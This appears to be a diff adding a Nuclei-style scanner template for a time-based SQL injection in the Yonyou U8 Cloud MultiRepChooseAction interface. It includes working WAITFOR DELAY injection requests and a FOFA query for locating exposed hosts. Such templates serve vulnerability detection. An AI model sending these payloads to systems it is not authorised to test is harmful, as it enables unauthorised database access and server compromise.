@@ -1,0 +1,40 @@
+id: yongyouU8-Cloud-MultiRepChooseAction-sql
+
+info:
+  name: 用友U8 Cloud MultiRepChooseAction SQL延时注入漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: title=="U8C"
+    用友U8 Cloud MultiRepChooseAction 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+  reference:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487314&idx=1&sn=9ce75b5f9a12365c1a12d62743c93970&chksm=c267ba61f5103377960676d642ed8f5cd62afc36ac34a207bfc6e7b0385f5449f2a06023dfb0&token=2053938247&lang=zh_CN#rd
+  tags: sql injection
+
+
+
+http:
+  - raw:
+      - |
+        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.MultiRepChooseAction&method=execute&taskId=1%27);WAITFOR+DELAY+%270:0:4%27-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+
+      - |
+        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.MultiRepChooseAction&method=execute&taskId=1%27);WAITFOR+DELAY+%270:0:8%27-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
+
+
+ 
+
+
+
+
